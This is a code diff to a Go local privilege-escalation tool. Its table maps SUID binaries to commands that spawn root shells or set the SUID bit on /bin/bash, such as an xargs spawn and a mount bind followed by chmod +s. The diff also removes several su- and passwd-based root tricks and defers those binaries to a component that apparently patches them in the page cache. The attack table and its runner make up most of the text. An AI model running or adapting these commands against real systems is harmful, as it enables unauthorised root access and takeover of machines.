@@ -13,9 +13,14 @@ import (
 // gtfobinsEntry describes how to abuse one SUID binary.
 // spawnCmd   = command that drops an interactive root shell directly.
 // suidCmd    = command that drops a SUID /bin/bash (for when spawn isn't possible).
+// needsPwd   = true if the binary prompts for a password (su, sudo, passwd,
+//              newgrp, chfn, chsh, gpasswd). These are SKIPPED in GTFOBins
+//              abuse because they would hang waiting for input; copyfail
+//              handles them by patching the binary in page cache instead.
 type gtfobinsEntry struct {
-	spawnCmd string // direct root shell (preferred)
-	suidCmd  string // chmod +s /bin/bash fallback
+	spawnCmd string
+	suidCmd  string
+	needsPwd bool
 }
 
 // GTFOBINS is the comprehensive SUID abuse table. Each key is the binary
@@ -114,16 +119,19 @@ var GTFOBINS = map[string]gtfobinsEntry{
 	"xargs":  {spawnCmd: "echo /bin/bash | xargs -I{} {} -p", suidCmd: "echo sh | xargs -I{} {} -c 'chmod +s /bin/bash'"},
 
 	// ── SUID binaries that copyfail targets specifically ──────────────────
-	// These are the pm.txt targets. We also abuse them directly.
-	"su":      {spawnCmd: "", suidCmd: "echo root | su -c 'chmod +s /bin/bash' 2>/dev/null"},
-	"sudo":    {spawnCmd: "sudo /bin/bash -p", suidCmd: "sudo chmod +s /bin/bash"},
-	"passwd":  {spawnCmd: "", suidCmd: "passwd root <<< $'root\\nroot' 2>/dev/null; echo root | su -c 'chmod +s /bin/bash'"},
-	"gpasswd": {spawnCmd: "", suidCmd: "echo root | su -c 'chmod +s /bin/bash' 2>/dev/null"},
-	"mount":   {spawnCmd: "", suidCmd: "mount -o bind /bin/bash /tmp/.sb; chmod +s /tmp/.sb"},
+	// These are the pm.txt targets. They require a password to function,
+	// so we DON'T try to abuse them via GTFOBINS (they would hang waiting
+	// for a password). copyfail patches them in page cache instead.
+	// Marking needsPwd=true so tryGTFOBins skips them entirely.
+	"su":      {spawnCmd: "", suidCmd: "", needsPwd: true},
+	"sudo":    {spawnCmd: "", suidCmd: "", needsPwd: true},
+	"passwd":  {spawnCmd: "", suidCmd: "", needsPwd: true},
+	"gpasswd": {spawnCmd: "", suidCmd: "", needsPwd: true},
+	"mount":   {spawnCmd: "", suidCmd: "mount -o bind /bin/bash /tmp/.sb 2>/dev/null; chmod +s /tmp/.sb 2>/dev/null"},
 	"umount":  {spawnCmd: "", suidCmd: ""},
-	"chfn":    {spawnCmd: "", suidCmd: ""},
-	"chsh":    {spawnCmd: "", suidCmd: "chsh -s /bin/bash; echo root | su -c 'chmod +s /bin/bash'"},
-	"newgrp":  {spawnCmd: "newgrp root", suidCmd: ""},
+	"chfn":    {spawnCmd: "", suidCmd: "", needsPwd: true},
+	"chsh":    {spawnCmd: "", suidCmd: "", needsPwd: true},
+	"newgrp":  {spawnCmd: "", suidCmd: "", needsPwd: true},
 }
 
 // scanSUID finds all SUID-root binaries on the system.
@@ -234,6 +242,15 @@ func suidPhase(s *systemInfo, stop *bool) {
 // Returns true if root was achieved.
 func tryGTFOBins(path string, e gtfobinsEntry, stop *bool) bool {
 	bin := filepath.Base(path)
+
+	// Skip password-requiring binaries entirely — they would hang the
+	// runner waiting for input. copyfail handles them by patching the
+	// binary in page cache (no password needed).
+	if e.needsPwd {
+		stepf("%-16s skip (password prompt — copyfail will handle)", bin)
+		return false
+	}
+
 	// Try the spawn command first (drops a root shell directly).
 	if e.spawnCmd != "" {
 		stepf("%-16s GTFOBins: %s", bin, e.spawnCmd)
